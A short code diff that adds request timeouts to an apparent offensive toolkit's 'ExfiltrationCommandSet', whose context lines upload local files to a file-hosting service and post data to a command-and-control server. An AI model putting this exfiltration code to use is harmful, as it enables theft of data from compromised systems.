@@ -944,7 +944,7 @@ class ExfiltrationCommandSet(LazyOwnCommandSet):
         try:
             with open(file_path, "rb") as handle:
                 files_payload = {"file": handle}
-                response = requests.post(GOFILE_UPLOAD_URL, files=files_payload)
+                response = requests.post(GOFILE_UPLOAD_URL, files=files_payload, timeout=10)
             response.raise_for_status()
             data = response.json()
             if data.get("status") != GOFILE_OK_STATUS:
@@ -1152,6 +1152,7 @@ class ExfiltrationCommandSet(LazyOwnCommandSet):
             auth=self.c2_auth,
             data=data,
             verify=self.c2_tls_verify,
+            timeout=60,
         )
         if response.status_code == 200:
             with open(output_path, "wb") as handle:
